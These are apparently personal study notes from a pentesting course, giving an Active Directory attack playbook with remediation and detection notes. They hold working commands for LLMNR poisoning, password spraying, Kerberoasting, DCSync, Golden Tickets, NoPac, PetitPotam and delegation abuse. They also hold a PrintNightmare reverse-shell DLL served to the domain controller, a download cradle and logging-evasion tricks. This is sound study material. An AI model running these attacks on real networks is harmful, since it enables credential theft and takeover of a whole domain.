# Active Directory Enumeration & Attacks

> Status: ✅ Complete (reference)
> Date started: 2026-10-26
> Date finished: 2026-10-27
## 1. Goal
Enumerate and attack Active Directory end to end: from no creds → a foothold user → privilege escalation / lateral movement → Domain Admin → persistence. The largest module and the core of internal pentesting.

## External recon (OSINT) — before touching the network
Passive (no interaction: public data) vs active (direct interaction: scans). Goal: IP space, domains, naming schema, data disclosures, breach creds.
- **IP/ASN:** whois, BGP toolkit, bgp.he.net → network ranges
- **Domains/subdomains:** nslookup/dig, Sublist3r, Amass, DNSdumpster
- **Exposed services:** Shodan, Censys
- **Breach creds:** Dehashed, HaveIBeenPwned
- **Secrets in code:** Trufflehog (repos), Google dorking
- **Schema:** work out username/email format (f.last@, first.last@) for later spraying
Stay in scope, authorized only, handle found data responsibly.

## Initial internal enumeration (foothold on the network)
Setup varies: internal VM/laptop/VPN/VDI/cloud box; grey or black box; evasive or not; with or without creds. Goal: live hosts, services, users, DCs, vulnerable targets.
```bash
# passive first — just listen
sudo tcpdump -i <iface>
sudo responder -I <iface> -A          # ANALYZE mode: watch LLMNR/NBT-NS/MDNS without poisoning
# active
fping -asgq 172.16.5.0/23             # fast alive-host sweep
sudo nmap -v -A -iL hosts.txt -oN host-enum
# user enum (no creds needed) with kerbrute
kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt -o valid_ad_users
```
- Key services to spot: Kerberos (88), NetBIOS (139), LDAP (389), DNS (53), SMB (445).
- `NT AUTHORITY\SYSTEM` on a domain-joined host = effectively a machine account in AD → enumerate/attack from there.
- Watch your noise and match it to the test type (evasive vs not). Flag EternalBlue/MS08-067-class vulns but get approval before exploiting.
- **First real goal: one valid domain user** — it unlocks authenticated enumeration (BloodHound, etc.).

## AD management PowerShell (quick reference)
Useful on a Windows foothold and for understanding what defenders see. `Import-Module ActiveDirectory`; `Get-Command -Module ActiveDirectory`.
```powershell
# recon-friendly reads
Get-ADUser -Identity <u> -Properties *
Get-ADComputer -Identity <name> -Properties * | select CN,CanonicalName,IPv4Address
Get-ADGroup -Identity "Domain Admins" -Properties * | select Name,GroupScope,Members
# management cmdlets (New/Set/Add/Remove-ADUser, -ADGroup, -ADGroupMember, GPO: New-GPLink/Copy-GPO)
```
> On the attacker side, the read cmdlets (`Get-AD*`) + PowerView are the enumeration workhorses; the write cmdlets matter when abusing delegated rights (e.g. adding yourself to a group BloodHound shows you can modify).

## LLMNR / NBT-NS Poisoning (the classic first-blood attack)
**Why it works:** when DNS fails, Windows falls back to LLMNR (UDP 5355) and NBT-NS (UDP 137), which *broadcast* "who is X?" to the whole subnet. Any host can answer. Poison the answer → the victim sends its **NTLMv2 hash** to you → crack it offline or relay it.

**Flow:** victim mistypes/queries a non-existent host → broadcasts LLMNR/NBT-NS → attacker (Responder) replies "that's me" → victim authenticates → hash captured.

### From Linux — Responder
```bash
# find poisonable hosts first
nmap -p5355 --script llmnr-resolve <range>
# analyze mode: watch, don't poison (recon-safe)
sudo responder -I <iface> -A
# active poisoning (SMB+HTTP capture)
sudo responder -I <iface> -wrf
cat /usr/share/responder/logs/Responder-Session.log     # captured hashes
```
Responder can also run a rogue **WPAD** proxy to capture HTTP auth. Alternatives: Inveigh, Metasploit modules.

### From Windows — Inveigh
```powershell
# PowerShell (legacy)
Import-Module .\Inveigh.ps1
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
Stop-Inveigh
# C# InveighZero (maintained): .\Inveigh.exe  → ESC for console → GET NTLMV2UNIQUE / GET NTLMV2USERNAMES
```

### Crack the captured hash
```bash
hashid captured_hash.txt
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt   # NetNTLMv2
```
Then reuse creds: `crackmapexec smb <HOST> -u <user> -p <pass>` (or `-H <hash>` for PtH) → lateral movement. If cracking fails, **password spray** the captured usernames.

### Remediation & detection (for the report)
- **Disable LLMNR:** GPO → Computer Config → Admin Templates → Network → DNS Client → "Turn off multicast name resolution" (registry `...DNSClient\EnableMulticast = 0`).
- **Disable NBT-NS:** adapter → TCP/IPv4 → Advanced → WINS → "Disable NetBIOS over TCP/IP" (push via GPO startup script setting `NetbiosOptions = 2`).
- **Enforce SMB signing** (blocks the relay variant); segment the network; NIDS.
- **Detect:** monitor UDP 5355 / 137, honeypot queries for fake hosts, Event IDs 4697 / 7045 (service install), Sysmon.

> This is usually the first thing I run on an internal test — passive `-A` first to confirm the protocols are live and in scope, then poison. One cracked hash from here is often the whole foothold.

## Password Spraying (one password, many users)
The safe way to use creds you don't have: try *one* common password across *all* users. **Rule: get the password policy FIRST** so you don't trip account lockouts.

### Step 1 — get the password policy
```bash
# credentialed
crackmapexec smb <DC> -u <u> -p <p> --pass-pol
# no creds (SMB null session / LDAP anon — older/misconfigured DCs)
rpcclient -U "" -N <DC>            # then: querydominfo , getdompwinfo
enum4linux-ng -P <DC> -oA out
ldapsearch -h <DC> -x -b "DC=<d>,DC=LOCAL" -s sub "*" | grep -m1 -B10 pwdHistoryLength
# on Windows:  net accounts   |   Import-Module PowerView; Get-DomainPolicy
```
What matters: **lockout threshold**, lockout **duration**, reset window, min length/complexity. Threshold 0 = no lockout (spray freely); else stay well under it.

### Step 2 — build the target user list
```bash
# no creds
enum4linux -U <DC> | grep "user:"                       # or rpcclient: enumdomusers
./windapsearch.py --dc-ip <DC> -u "" -U
kerbrute userenum -d <domain> --dc <DC> users.txt       # Kerberos pre-auth, fast/stealthier
# credentialed
crackmapexec smb <DC> -u <u> -p <p> --users             # shows badpwdcount!
ldapsearch -h <DC> -x -b "DC=<d>,DC=LOCAL" "(objectclass=user)" | grep sAMAccountName | cut -d" " -f2
# OSINT: company emails, linkedin2username → match the naming schema
```

### Step 3 — spray (slow, logged)
```bash
kerbrute passwordspray --dc <DC> -d <domain> -U users.txt -p 'Welcome1'
crackmapexec smb <DC> -u users.txt -p 'Welcome1' --no-bruteforce   # 1 pw x all users
# loop multiple passwords with a delay to respect lockout policy
for pw in Welcome1 Passw0rd Winter2024; do
  cme smb <DC> -u users.txt -p "$pw" --no-bruteforce
  sleep 1800     # wait out the lockout window between rounds
done
```
Then validate + loot: `cme smb <DC> -u <user> -p <pw> --shares --sessions`.

**Operational notes (worth knowing):**
- kerbrute userenum generates **Event ID 4768** (TGT requested) — not silent.
- `badpwdcount` is tracked **per DC**; the **PDC emulator** holds the most accurate count. Spraying across DCs can multiply attempts, so account for that.
- Keep a **log** of every spray (user set, DC, time, password) — avoids duplicate lockout risk and documents the test.

> Spraying is how a user list with no passwords becomes a foothold. The discipline is all in step 1 — lock out a client's users and you've caused an incident, not found a finding.

### Spraying — execution specifics
```bash
# Linux
for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" <DC> | grep Authority; done
kerbrute passwordspray -d <domain> --dc <DC> valid_users.txt Welcome1
sudo crackmapexec smb <DC> -u valid_users.txt -p Password123 | grep +
```
```powershell
# Windows
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

### Local admin password reuse (high-value)
If one local Administrator hash/password is shared across machines (classic without LAPS), spray it across the subnet with `--local-auth` → instant local admin on every box that reuses it:
```bash
sudo crackmapexec smb --local-auth <range> -u administrator -H <NT_hash> | grep +
```
This is often how one cracked/dumped local-admin hash cascades into the whole network. **Fix: LAPS** (unique local admin password per host).

### Detection & external targets (for the report)
- **Detect:** Event ID **4625** (failed logon), **4771** (Kerberos pre-auth failure) spiking across many accounts.
- **Mitigate:** MFA, least privilege, strong password policy/filters, separate admin vs user accounts, LAPS.
- **External spray surfaces** (same technique, internet-facing): M365 / OWA, Citrix / VMware Horizon / RDS, VPN portals (Fortinet, SonicWall), custom AD-auth web apps.

## Credentialed enumeration (once I have a valid domain account)
First real account unlocks deep enumeration. Feed everything into **BloodHound**.

### Enumerate defenses first (know what's watching)
```powershell
Get-MpComputerStatus                              # Defender
Get-AppLockerPolicy -Effective | select -Expand RuleCollections   # AppLocker
$ExecutionContext.SessionState.LanguageMode       # Constrained Language Mode?
Get-NetFirewallProfile ; Get-HotFix ; Get-BitLockerVolume
# LAPS (LAPSToolkit): Find-LAPSDelegatedGroups, Find-AdmPwdExtendedRights, Get-LAPSComputers
```

### From Linux
```bash
crackmapexec smb <DC> -u <u> -p <p> --users --groups --loggedon-users --shares
crackmapexec smb <DC> -u <u> -p <p> -M spider_plus --share '<share>'   # spider shares
smbmap -u <u> -p <p> -d <domain> -H <DC> -R '<share>'                  # recursive share listing
rpcclient -U "" -N <DC>          # enumdomusers, queryuser <rid>
windapsearch.py -d <domain> --dc-ip <DC> -u <u> -p <p> --users --gpos
# interactive shells (also -hashes LM:NT for PtH)
psexec.py <domain>/<u>:'<p>'@<HOST>
wmiexec.py <domain>/<u>:'<p>'@<HOST>
```

### From Windows
```powershell
# built-in AD module (stealthy)
Import-Module ActiveDirectory
Get-ADDomain ; Get-ADTrust -Filter *
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName   # SPN/kerberoastable
Get-ADGroupMember -Identity "Domain Admins"
# PowerView / SharpView (situational awareness)
Import-Module .\PowerView.ps1    # (Set-ExecutionPolicy Bypass -Scope Process first)
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainTrustMapping
Test-AdminAccess -ComputerName <host>      # where am I local admin?
Get-DomainUser -TrustedToAuth              # delegation
# Snaffler — hunt creds/secrets across shares
Snaffler.exe -s -d <domain> -o snaffler.log -v data
```

### Living off the Land (no tools uploaded, stealthier, log-evasion)
When on a managed host with no internet/tooling, built-ins do the enum:
```text
# host:  hostname, systeminfo, set, echo %USERDOMAIN%, echo %logonserver%
# PS history:  Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
# net:   net user /domain, net group "Domain Admins" /domain, net localgroup administrators,
#        net group "Domain Controllers" /domain, net share, net view /domain   (net1 = less-monitored alias)
# wmic:  wmic useraccount list, wmic group list, wmic ntdomain list, wmic qfe (patches)
# dsquery user / dsquery computer
```
- `powershell.exe -version 2` downgrades to evade modern logging (AMSI/ScriptBlock) — a known evasion.
- Download cradle (file transfer onto host): `iex(New-Object Net.WebClient).DownloadString('<URL>')` — flagged by AMSI; covered more in module 07.

> The pattern: enumerate defenses → pick tooling that survives them (built-in/LotL under AppLocker+CLM) → map everything in BloodHound → the shortest path to DA appears. Snaffler + share spidering find the creds people leave lying around.

## Kerberoasting (detail)
**Why it works:** any authenticated domain user can request a **TGS** for any account with an **SPN** (service accounts). The ticket is encrypted with the service account's password hash → crack it offline. No special privileges needed, which is why it's a top early win. Service accounts often have old, weak, non-expiring passwords.

### From Linux (Impacket)
```bash
# list kerberoastable SPNs
GetUserSPNs.py -dc-ip <DC> <DOMAIN>/<USER>
# request + save all TGS hashes
GetUserSPNs.py -dc-ip <DC> <DOMAIN>/<USER> -request -outputfile tgs.hashes
# target one account
GetUserSPNs.py -dc-ip <DC> <DOMAIN>/<USER> -request-user <svc> -outputfile svc.hash
```

### From Windows (Rubeus = modern go-to)
```powershell
.\Rubeus.exe kerberoast /nowrap                      # all roastable accounts, hashcat-ready
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap   # only high-value (admin) SPNs
.\Rubeus.exe kerberoast /stats                       # recon: how many, which encryption
# PowerView alternative
Import-Module .\PowerView.ps1
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv tgs.csv -NoType
# built-in enumeration
setspn.exe -Q */*
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
(Legacy manual path: mimikatz `kerberos::list /export` → base64 → `.kirbi` → kirbi2john → hashcat. Rubeus replaces all of this.)

### Crack & use
```bash
hashcat -m 13100 tgs.hashes /usr/share/wordlists/rockyou.txt      # (john: --format=krb5tgs)
```
Cracked service-account password → test/use it:
```bash
evil-winrm -i <HOST> -u <svc> -p '<pass>'
```
If that account is privileged (or `admincount=1`), you may jump straight toward DA.

### Defense (report)
- **Strong, long (25+ char) managed service-account passwords** (gMSA where possible) → uncrackable.
- Least privilege for service accounts; monitor **Event ID 4769** (TGS requests) for roasting patterns; prefer AES over RC4.

> Kerberoast is the "any domain user" attack — the moment you have one foothold credential, run it. `/ldapfilter:'admincount=1'` focuses on the accounts whose crack actually matters.

## ACL / ACE Abuse (detail)
AD objects have DACLs; a misassigned right over another object is a privilege-escalation edge. **BloodHound draws these as edges** ("`wley` has GenericWrite over `svc_acct`") — that's usually how you find them. PowerView enumerates/abuses them.

**Abusable rights → what you can do:**
| Right over target | Abuse |
|---|---|
| **ForceChangePassword** | reset the target's password |
| **GenericAll** | full control (reset pw, add to group, RBCD, targeted Kerberoast) |
| **GenericWrite / WriteProperty** | set attributes — e.g. add an SPN → Kerberoast, or set `member` |
| **AddMember / AddSelf** | add a principal (yourself) to a group |
| **WriteOwner** | make yourself owner → then WriteDACL |
| **WriteDACL** | grant yourself any right (e.g. DCSync) |
| **AllExtendedRights** | includes ForceChangePassword, and on the domain → DCSync |

**Enumerate:**
```powershell
Import-Module .\PowerView.ps1
Find-InterestingDomainAcl -ResolveGUIDs
# what rights does a SID I control have?
$sid = Convert-NameToSid <user>
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

**Abuse primitives:**
```powershell
Set-DomainUserPassword -Identity <t> -AccountPassword (ConvertTo-SecureString '<pw>' -AsPlainText -Force)   # ForceChangePassword
Add-DomainGroupMember -Identity '<group>' -Members <me>                                   # AddMember
Set-DomainObject -Identity <t> -Set @{serviceprincipalname='fake/spn'}                    # GenericWrite → then Kerberoast
Set-DomainObjectOwner -Identity <t> -OwnerIdentity <me>                                   # WriteOwner
Add-DomainObjectAcl -TargetIdentity "DC=<d>,DC=local" -PrincipalIdentity <me> -Rights DCSync   # WriteDACL → DCSync
```
> Chains matter: WriteOwner → WriteDACL → grant self DCSync → dump the domain. BloodHound shows the whole chain; PowerView executes each hop.

## DCSync (detail)
Impersonate a DC and pull hashes via replication. Needs **DS-Replication-Get-Changes** + **-Get-Changes-All** (DA/EA by default, or granted via the ACL chain above).
```powershell
# confirm my user has the rights
$sid = (Convert-NameToSid <user>)
Get-ObjectAcl "DC=<d>,DC=local" -ResolveGUIDs | ? {$_.ObjectAceType -match 'Replication-Get' -and $_.SecurityIdentifier -match $sid}
```
```bash
# Linux — Impacket
secretsdump.py -just-dc INLANEFREIGHT/<user>@<DC>                 # all hashes
secretsdump.py -just-dc-user administrator INLANEFREIGHT/<user>@<DC>   # one user
secretsdump.py -just-dc -history INLANEFREIGHT/<user>@<DC>        # incl. password history
```
```text
# Windows — mimikatz (run as the privileged user: runas /netonly)
privilege::debug
lsadump::dcsync /domain:<d> /user:<DOMAIN>\administrator
```
Grab **krbtgt** → Golden Ticket. **Detect/mitigate:** Event ID 4662; replication rights to DCs only; least privilege; rotate krbtgt.

## Using privileged access (WinRM / RDP / MSSQL)
Once you own a user with remote rights, log in and work:
```powershell
# who can remote in?
Get-NetLocalGroupMember -ComputerName <host> -GroupName "Remote Desktop Users"
Get-NetLocalGroupMember -ComputerName <host> -GroupName "Remote Management Users"
# WinRM session
$cred = New-Object System.Management.Automation.PSCredential('<DOM>\<u>',(ConvertTo-SecureString '<pw>' -AsPlainText -Force))
Enter-PSSession -ComputerName <host> -Credential $cred
```
```bash
evil-winrm -i <host> -u <u> -p '<pw>'                 # WinRM from Linux
mssqlclient.py <DOM>/<u>@<host> -windows-auth          # then: enable_xp_cmdshell ; xp_cmdshell whoami
# PowerUpSQL: Get-SQLInstanceDomain ; Get-SQLQuery -Instance <h> -Query 'SELECT @@version'
```
BloodHound cypher: `CanPSRemote` edge = WinRM access, `SQLAdmin` edge = MSSQL admin.

## Kerberos Double-Hop problem
WinRM/PSRemoting uses NTLM-less Kerberos, so your creds **can't forward to a second hop** (TGT not stored in the remote session). Symptom: works on DEV01, access to a third box fails. Fixes:
- **CredSSP:** `Enable-WSManCredSSP -Role Client -DelegateComputer <srv>` (client) + `-Role Server` (server), then `Enter-PSSession ... -Authentication CredSSP`. Caveat: delegates plaintext creds (riskier).
- Pass a `-Credential $Cred` object directly to PowerView cmdlets inside the session (works for single commands).
- **KCD** (constrained delegation) is the secure, config-side fix.

## Bleeding-edge AD CVEs (reference)
All need a valid domain user + a vulnerable (unpatched) DC. Tools: Impacket + the named PoCs.
- **NoPac — CVE-2021-42278 + 42287 (sAMAccountName spoofing)** → straight to DA.
  ```bash
  python3 scanner.py <dom>/<u>:<p> -dc-ip <DC> -use-ldap          # check
  python3 noPac.py <dom>/<u>:<p> -dc-ip <DC> -dc-host <DCNAME> -shell --impersonate administrator -use-ldap
  # or -dump -just-dc-user <dom>/administrator  (DCSync)
  ```
- **PrintNightmare — CVE-2021-34527 / 1675 (Spooler RCE → SYSTEM).**
  ```bash
  rpcdump.py @<DC> | egrep 'MS-RPRN|MS-PAR'     # spooler active?
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ME> LPORT=<P> -f dll > x.dll
  sudo smbserver.py -smb2support Share /path/    # host the DLL ; set up multi/handler
  python3 CVE-2021-1675.py <dom>/<u>:<p>@<DC> '\\<ME>\Share\x.dll'
  ```
- **PetitPotam — CVE-2021-36942 (coerce DC auth → relay to AD CS → DC cert → DCSync).**
  ```bash
  ntlmrelayx.py -smb2support --target http://<CA>/certsrv/certfnsh.asp --adcs --template DomainController
  python3 PetitPotam.py <ME> <DC>              # coerce
  # gettgtpkinit.py with the captured cert → KRB5CCNAME → secretsdump -k -no-pass
  ```

## Miscellaneous misconfigurations (quick wins)
```powershell
# passwords left in the description field
Get-DomainUser * | ? {$_.Description} | select samaccountname,description
# accounts that don't require a password
Get-DomainUser -UACFilter PASSWD_NOTREQD | select samaccountname,useraccountcontrol
# creds in SYSVOL logon scripts
ls \\<DC>\SYSVOL\<domain>\scripts ; cat \\<DC>\SYSVOL\<domain>\scripts\<script>.vbs
# hidden DNS records
# adidnsdump -u <dom>\<u> ldap://<DC> [-r]
```
- **GPP cpassword:** `Groups.xml` in SYSVOL stores an AES-encrypted local-admin password with a **public key** → trivially decrypt: `gpp-decrypt <cpassword>` or `crackmapexec smb <DC> -u <u> -p <p> -M gpp_autologin`.
- **AS-REP Roasting** (accounts with pre-auth disabled — no creds needed to request):
  ```bash
  GetNPUsers.py <DOM>/ -dc-ip <DC> -no-pass -usersfile users.txt -format hashcat
  # or Rubeus.exe asreproast /nowrap /format:hashcat
  hashcat -m 18200 asrep.hash rockyou.txt
  ```
- **GPO abuse:** writable GPO → push a local admin, scheduled task, or rights to a user (tools: SharpGPOAbuse). **MS14-068:** PAC forging (patch is the only fix). **Exchange** groups (Exchange Windows Permissions) often hold DCSync-equivalent rights — PrivExchange.

> Half of AD compromises come from this "misc" list, not fancy Kerberos math: a password in a description, a cpassword in SYSVOL, an AS-REP-roastable account. Always check these early — they're free.

## AD attack flow (reference)
Key ports: 88 (Kerberos), 135/593 (RPC), 139/445 (SMB), 389/636/3268/3269 (LDAP/GC), 464 (kpasswd), 3389 (RDP).

### 1. Enumeration (always first)
Goal: users, computers, groups, misconfigs.
```bash
# no creds
nmap -p88,135,139,389,445,464,593,636,3268,3389 --script="ldap* smb*" <HOST>
smbclient -L //<DC> -N                 # null-session shares
crackmapexec smb <DC>                   # host/domain info
kerbrute userenum -d <domain> --dc <DC> users.txt    # valid users (no creds needed)
# with creds
bloodhound-python -u <u> -p <p> -d <domain> -c All -dc-ip <DC>   # map attack paths
crackmapexec ldap <DC> -u <u> -p <p> --asreproast
rpcclient -U '<u>%<p>' <DC>
net user /domain ; net group "Domain Admins" /domain    # (on a Windows foothold)
```

### 2. Get / escalate credentials
```bash
# Kerberoasting (any domain user can request SPN tickets)
GetUserSPNs.py -dc-ip <DC> <domain>/<u>:<p> -request
hashcat -m 13100 hash.txt rockyou.txt
# AS-REP Roasting (accounts with "do not require pre-auth")
GetNPUsers.py -dc-ip <DC> -usersfile users.txt <domain>/ -format hashcat
hashcat -m 18200 hash.txt rockyou.txt
```

### 3. Lateral movement
```bash
# dump creds from a compromised host (admin)
# mimikatz: sekurlsa::logonpasswords
# Pass-the-Hash
psexec.py <domain>/<u>@<HOST> -hashes <LM>:<NT>
crackmapexec smb <range> -u <u> -H <NT>        # spray a hash across hosts
# NTLM relay (when SMB signing is disabled)
ntlmrelayx.py -t smb://<HOST> --smb2support
```

### 4. Domain compromise + persistence
```bash
whoami /groups ; net group "Domain Admins" /domain     # confirm DA
# dump all domain hashes (DCSync, needs DA or replication rights)
secretsdump.py <domain>/<admin>:<pass>@<DC>
# Golden Ticket (persistence; needs the krbtgt hash)
# mimikatz: kerberos::golden /user:Administrator /domain:<d> /sid:<SID> /krbtgt:<hash> /ptt
```

### Decision tree (what to try next)
1. **No creds?** → enumerate (kerbrute, null SMB, CME). **Have creds?** → BloodHound + CME.
2. **Kerberoast / AS-REP possible?** → grab hashes, crack offline. **No?** → lateral movement.
3. **SMB/LDAP/Kerberos misconfig?** → NTLM relay / PtH / Kerberos attacks. **No?** → local privesc on a workstation (modules 25/26).
4. **Domain Admin?** → DCSync + persistence. **No?** → pivot to another user/host, repeat.

> BloodHound is the force multiplier — it shows the *shortest path* to DA so you're not guessing. Kerberoasting + AS-REP roasting are the highest-value early wins because any domain user can attempt them. krbtgt hash = keys to the kingdom (Golden Ticket).

## Key AD attacks — detail (reference)
Commands are standard tooling; all intrusive, scope + approval. Detection Event IDs included for the report/remediation side.

### DCSync (domain replication abuse)
Impersonate a DC and pull hashes via replication — needs **Replicating Directory Changes** rights (DA or delegated). Pulling **krbtgt** enables Golden Ticket.
```powershell
# who has replication rights (abusable)
Get-ObjectAcl -DistinguishedName "dc=<domain>,dc=local" -ResolveGUIDs | ? {$_.ObjectType -match 'replication'}
# dump
mimikatz: lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
# or impacket: secretsdump.py <domain>/<admin>:<pass>@<DC>
```
**Detect/mitigate:** Event ID 4662; replication rights to trusted accounts only; rotate krbtgt regularly.

### Golden Ticket (persistence)
With the **krbtgt hash**, forge TGTs for any user — survives password changes and account deletion.
```text
mimikatz: kerberos::golden /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /user:Administrator /ptt
```
**Detect/mitigate:** Event IDs 4769/4672; rotate krbtgt password twice; strong Kerberos policy. (Silver Ticket = same idea but forges a TGS for one service using that service account's hash.)

### Shadow Credentials (Key Trust abuse)
Write to a victim's **msDS-KeyCredentialLink** to add attacker-controlled key creds → authenticate as them without resetting their password. Needs write rights over the target (find via BloodHound).
```text
# tooling: Whisker (add key cred) + Rubeus (request TGT with the cert)
# enum: Get-ADUser -Filter * -Properties msDS-KeyCredentialLink
```
**Detect/mitigate:** Event ID 5136 (msDS-KeyCredentialLink changes); restrict who can write it; ADCS hardening.

### Printer Bug / PrintNightmare (MS-RPRN)
Spooler RPC coerces a host to authenticate to the attacker (→ relay) or loads a malicious driver DLL as SYSTEM. Variants: CVE-2021-1675, CVE-2021-34527.
```text
sc qc Spooler                  # is the service running?
# coercion: SpoolSample / printerbug.py <attacker> <victim>  → feed into NTLM relay
```
**Detect/mitigate:** disable Spooler where unneeded — **always on Domain Controllers**; patch.

### NTLM Relay (no password needed)
Capture NTLM auth and relay it to another service (SMB/LDAP/HTTP). Works when **signing is not enforced**.
```bash
responder -I <iface> -wrf              # capture / coerce auth
ntlmrelayx.py -tf targets.txt -smb2support    # relay (add --escalate-user / -c for actions)
```
**Detect/mitigate:** **enable SMB signing** (blocks SMB relay); enforce LDAP signing + channel binding; reduce admin sprawl.

> These five are the backbone of internal pentests: Printer Bug/NTLM relay get you from low-priv to a hash/foothold, DCSync gets krbtgt, Golden Ticket keeps it forever. Shadow Credentials is the stealthy modern takeover-a-user move.

## Kerberos Delegation (reference)
Delegation lets a service authenticate *as a user* to another service (for SSO). Misconfigured = privesc / domain takeover. Three types, worst to best:

### Unconstrained delegation (most dangerous)
The service can store **any** user's TGT. Compromise such a host, wait for (or coerce, via Printer Bug) a privileged user to authenticate, then extract their TGT → impersonate them (incl. DA).
```powershell
# find (userAccountControl TRUSTED_FOR_DELEGATION = 0x80000)
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
# on the host (SYSTEM): mimikatz  sekurlsa::tickets /export   → reuse the TGT
```
**Mitigate:** avoid it; never on DCs; mark sensitive accounts "not delegated" / Protected Users.

### Constrained delegation
Service can delegate only to **specific SPNs** (`msDS-AllowedToDelegateTo`). If you control such an account, you can use **S4U2Self + S4U2Proxy** to get a ticket as any user to those services.
```powershell
Get-ADObject -LDAPFilter "(msDS-AllowedToDelegateTo=*)"
# abuse: Rubeus s4u  /user:<svc> /rc4:<hash> /impersonateuser:Administrator /msdsspn:<spn> /ptt
#    or: impacket getST.py -spn <spn> -impersonate Administrator <domain>/<svc>:<pass>
```
Note: "protocol transition" variants let you impersonate without the user authenticating. Mitigate: restrict to trusted services, strong service-account passwords.

### Resource-Based Constrained Delegation (RBCD)
The **target resource** decides who may delegate to it (`msDS-AllowedToActOnBehalfOfOtherIdentity`). If you have **write rights over a computer object** (common via BloodHound), set RBCD to a machine account you control, then S4U to impersonate any user to that target.
```powershell
Get-ADComputer -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -ne "$null"}
# chain: control/create a computer account → set RBCD on victim to point to it →
#        Rubeus s4u (or getST.py -impersonate) → ticket as Administrator to the victim → psexec/wmiexec
```
**Mitigate:** monitor `msDS-AllowedToActOnBehalfOfOtherIdentity` changes; restrict who can write computer object attributes.

**Delegation vs Kerberoasting:** delegation abuse = privilege escalation via misconfigured delegation accounts (tools: Rubeus, PowerView, impacket; risk: domain takeover). Kerberoasting = offline cracking of SPN account passwords (tools: GetUserSPNs.py, hashcat; risk depends on password strength). Different attacks, both target service accounts.

> RBCD is the modern go-to: BloodHound finds "you have write over this computer," and that single edge turns into SYSTEM on it via the RBCD → S4U chain.

## Domain Trusts
Trusts let users authenticate across domains/forests. Types: **parent-child** (same forest, transitive, two-way), cross-link, **external** (cross-forest, non-transitive, SID filtering on), tree-root, **forest** (forest-root to forest-root, transitive), ESAE (bastion). Direction: one-way (trusted users reach trusting domain) vs bidirectional.

**Enumerate:**
```powershell
Get-ADTrust -Filter *            # built-in
Get-DomainTrust ; Get-DomainTrustMapping    # PowerView
netdom query /domain:<domain> trust
```
BloodHound: "Map Domain Trusts" query. Trusts are a prime **pivot** between domains.

### Child → Parent escalation: ExtraSIDs / SID History
Within a forest, **SID filtering is off between parent and child**, so a child-domain compromise → full forest. Forge a Golden Ticket that injects the parent's **Enterprise Admins** SID into `sidHistory`. Need: child **krbtgt hash**, child domain SID, a username (can be fake), child FQDN, parent Enterprise Admins SID.

**Gather:**
```text
# krbtgt hash:  mimikatz lsadump::dcsync /user:<CHILD>\krbtgt   (or secretsdump -just-dc-user <CHILD>/krbtgt)
# child SID:    Get-DomainSID   (or lookupsid.py ... | grep "Domain SID")
# EA SID:       Get-DomainGroup -Domain <PARENT> -Identity "Enterprise Admins" | select objectsid
```

**From Windows (mimikatz / Rubeus):**
```text
mimikatz: kerberos::golden /user:hacker /domain:<CHILD> /sid:<CHILD_SID> /krbtgt:<HASH> /sids:<PARENT_EA_SID> /ptt
# or: Rubeus.exe golden /rc4:<HASH> /domain:<CHILD> /sid:<CHILD_SID> /sids:<PARENT_EA_SID> /user:hacker /ptt
klist ; dir \\<parent-dc>\c$          # verify → then DCSync the parent
```

**From Linux (Impacket):**
```bash
secretsdump.py <child>/<adm>@<child-dc> -just-dc-user <CHILD>/krbtgt
lookupsid.py <child>/<adm>@<child-dc> | grep "Domain SID"
lookupsid.py <child>/<adm>@<parent-dc> | grep -B12 "Enterprise Admins"
ticketer.py -nthash <KRBTGT_HASH> -domain <CHILD> -domain-sid <CHILD_SID> -extra-sid <PARENT_EA_SID> hacker
export KRB5CCNAME=hacker.ccache
psexec.py <CHILD>/hacker@<parent-dc> -k -no-pass -target-ip <parent-dc-ip>
# or fully automated:
raiseChild.py -target-exec <parent-dc-ip> <CHILD>/<adm>
```

**Defense:** enable SID filtering / quarantine (`netdom trust ... /quarantine:yes`), monitor sidHistory changes (Event IDs 4765/4766), minimize EA/DA membership, tiered admin model, audit trusts.

> Key idea: in a single forest, owning a **child** domain = owning the **whole forest**, because SID filtering isn't enforced internally. `raiseChild.py` automates it, but know the manual steps for the exam and for when autopwn is too risky on a client.

## Cross-Forest Trust Abuse
Across a **forest** trust, SID filtering is usually ON, so the child→parent ExtraSIDs trick doesn't apply — but these do:

- **Cross-forest Kerberoasting** — request TGS for SPN accounts in the *trusting* forest (any authenticated user across the trust can):
  ```powershell
  Get-DomainUser -SPN -Domain <OTHER_FOREST> | select SamAccountName
  .\Rubeus.exe kerberoast /domain:<OTHER_FOREST> /user:<svc> /nowrap
  # hashcat -m 13100
  ```
- **Admin password reuse** — with a bidirectional trust, creds cracked in forest A often work in forest B (people reuse admin passwords across orgs/forests). Just test them.
- **Foreign group membership** — accounts from one forest added to privileged groups in the other:
  ```powershell
  Get-DomainForeignGroupMember -Domain <OTHER_FOREST>
  Convert-SidToName <SID>
  Enter-PSSession -ComputerName <dc.other-forest> -Credential <THIS_FOREST>\administrator   # verify
  ```
- **SID history** — only abusable cross-forest when SID filtering is **disabled** (misconfig).

**Defense:** enforce SID filtering on forest trusts, no password reuse across forests, audit foreign group memberships, minimize SPN exposure.

> Cross-forest is more about *finding the human mistakes* — a reused admin password, an account borrowed into the other forest's admins, a Kerberoastable service account reachable across the trust — than a protocol trick, because SID filtering blocks the clean ExtraSIDs path.

## AD attack catalog (by phase — study/coverage index)
